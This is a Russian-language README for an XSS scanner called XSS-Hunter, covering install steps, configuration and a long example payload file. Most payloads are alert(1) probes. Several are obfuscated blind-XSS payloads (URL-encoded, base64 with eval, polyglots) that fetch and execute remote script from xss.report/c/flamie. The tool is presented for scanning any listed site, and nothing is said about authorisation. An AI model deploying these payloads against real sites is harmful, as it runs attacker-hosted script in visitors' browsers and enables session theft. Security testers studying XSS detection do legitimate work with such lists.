# XSS-Hunter

XSS-Hunter: Простой Сканер Уязвимостей XSS

XSS-Hunter — это простой, но эффективный сканер для поиска уязвимостей Cross-Site Scripting (XSS) на веб-сайтах. Этот инструмент разработан для автоматического обнаружения отраженных XSS через различные векторы, включая параметры URL, данные форм (GET/POST) и HTTP-заголовки. Он также поддерживает базовый краулинг для обнаружения большего количества потенциально уязвимых страниц.

Основные возможности:

   Сканирование параметров URL: Проверяет GET и POST параметры на наличие отраженных XSS.
   Анализ и тестирование форм: Автоматически извлекает формы со страниц и внедряет пейлоады во все их поля.
  Тестирование HTTP-заголовков: Проверяет распространённые заголовки (User-Agent, Referer, Cookie, X-Forwarded-For) на предмет отражения.
   Базовый краулинг: Обходит страницы целевого сайта для расширения области сканирования.
   Настраиваемые пейлоады и цели: Использует файлы для загрузки списков пейлоадов и целевых URL.
  Логирование результатов: Сохраняет все найденные уязвимости и информацию о сканировании в структурированные файлы логов.
  Верификация XSS (опционально): Позволяет настроить внешний сервер для подтверждения выполнения JavaScript, что снижает количество ложных срабатываний.
  Контроль параллелизма и ретраи: Ограничивает количество одновременных запросов и повторяет неудачные попытки для повышения надёжности.

Начало работы

Чтобы начать пользоваться XSS-Hunter, вам необходимо выполнить несколько простых шагов.
Требования

   Node.js: Убедитесь, что у вас установлена актуальная версия Node.js (рекомендуется LTS). Вы можете скачать её с официального сайта Node.js.

Установка
    Клонируйте репозиторий
    
    git clone https://github.com/your-username/xss-hunter.git
    
Далее

      cd xss-hunter

(Замените your-username на имя вашего пользователя GitHub после публикации).

Установите зависимости:
Bash

    npm install

Конфигурация

Перед запуском сканера вам нужно настроить файлы с пейлоадами и целевыми URL, а также (опционально) изменить параметры в коде.

   payloads.txt: Создайте этот файл в корневой директории проекта. Каждая строка в нём должна содержать один XSS-пейлоад.
    Пример payloads.txt:

    <script>alert(1)</script> 
    "><script>alert(1)</script>
    '><script>alert(1)</script>
    "><img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    <iframe src="javascript:alert(1)"></iframe>
    <math href="javascript:alert(1)">CLICK</math>
    <video><source onerror="alert(1)">
    <details open ontoggle=alert(1)>
    <marquee onstart=alert(1)>
    <isindex action=javascript:alert(1)>
    <base href="javascript://"><script>alert(1)</script>
    <embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
    <svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
    "><style>@keyframes x{}</style><svg onload=alert(1)>
    <script/src=data:text/javascript,alert(1)>
    "><script src=//0x7f.0x0/alert(1)></script>
    "><object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
    <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
    <svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>
    <svg><script xlink:href="data:image/svg+xml,%3Cscript%3Ealert(1)%3C/script%3E"></script></svg>
    "><input autofocus onfocus=alert(1)>
    '"><script src=https://xss.report/c/flamie></script>
    javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/flamie\';document.body.appendChild(a)')
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\flamie/.source))//>
    %3Cbody%20onload=%22var%20a=document.createElement('script');a.src='https://xss.report/c/flamie';document.body.appendChild(a)%22%3E
    %22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2ZsYW1pZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;%20onerror=eval(atob(this.id))%3E
    javascript:%22/*'/*%60/*--%3E%3C/noscript%3E%3C/title%3E%3C/textarea%3E%3C/style%3E%3C/template%3E%3C/noembed%3E%3C/script%3E%3Chtml%20%22%20onmouseover=/*&lt;svg/*/onload=(import(/https:%5Cxss.report%5Cc%5Cflamie/.source))//%3E
    %3Cscript%3Efetch(%22//xss.report/c/flamie%22).then(r=%3Er.text()).then(t=%3Eeval(t))%3C/script%3E
    var%20a=document.createElement(%22script%22);a.src=%22https://xss.report/c/flamie%22;document.body.appendChild(a);
    '%22%3E%3Cscript%20src=https://xss.report/c/flamie%3E%3C/script%3E
    "><form><button formaction="javascript:alert(1)">X</button></form>
    "><button formaction="javascript:alert(1)">CLICK</button>
    <svg xmlns="http://www.w3.org/2000/svg"><script href="data:,alert(1)"/>
    "><script id="xss">eval(atob('YWxlcnQoMSk='))</script>
    <iframe srcdoc="<script>alert(1)</script>">
    <svg><animate attributeName="href" values="javascript:alert(1)" />

  url.txt: Создайте этот файл в корневой директории проекта. Каждая строка должна содержать один полный URL целевого сайта, который вы хотите сканировать.
    Пример url.txt:

    http://testphp.vulnweb.com/
    http://www.example.com/

   CONFIG в main.js (опционально): Откройте файл main.js и отредактируйте объект CONFIG в верхней части файла, если вам нужны особые настройки.
    JavaScript

    const CONFIG = {
        payloadsFile: 'payloads.txt',
        targetsFile: 'url.txt',
        logDir: 'log',
        commonPaths: ['/', '/search', '/index.php', '/catalog', '/blog', '/products', '/news', '/admin', '/login', '/register'],
        commonParams: ['q', 's', 'search', 'query', 'term', 'id', 'item', 'page', 'input', 'keywords', 'txt', 'user', 'password'],
        concurrencyLimitPerSite: 5,
        timeout: 30000,
        maxCrawlDepth: 3,
        // --- ОПЦИОНАЛЬНО ---
        // Укажите URL вашего контролируемого сервера для верификации XSS.
        // Если пусто или null, верификация исполнения JS будет пропущена (только проверка отражения).
        // Пример: 'http://your-controlled-server.com'
        verificationServer: null, // ИЗМЕНИТЕ ЭТО НА СВОЙ СЕРВЕР ДЛЯ РЕАЛЬНОЙ ВЕРИФИКАЦИИ!
        // -------------------
        customHeaders: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        },
        retryAttempts: 3,
        retryFactor: 2,
        retryMinTimeout: 1000,
        retryMaxTimeout: 5000
    };

   Особое внимание уделите verificationServer: Если вы хотите получать реальное подтверждение выполнения XSS-пейлоада (а не только его отражение на странице), вам нужно развернуть простой HTTP-сервер, который будет слушать входящие запросы на указанный URL и записывать их. Если этот параметр null, сканер будет сообщать о "потенциальной XSS" только на основе отражения пейлоада, что может привести к ложным срабатываниям.

Запуск сканера

После настройки файлов и (опционально) CONFIG, вы можете запустить сканер:
Bash

    node main.js

Сканер начнет работу, обходя целевые URL и тестируя их на XSS. Все найденные уязвимости будут записываться в поддиректории внутри папки log/.
Результаты сканирования

Все логи и найденные уязвимости сохраняются в директории log. Для каждого запуска сканера будет создана новая папка вида log N (например, log 1, log 2), а внутри неё — отдельные папки для каждого сканируемого домена. В этих папках вы найдёте текстовые файлы с подробной информацией о найденных XSS, включая URL, использованный пейлоад, параметр и метод запроса.
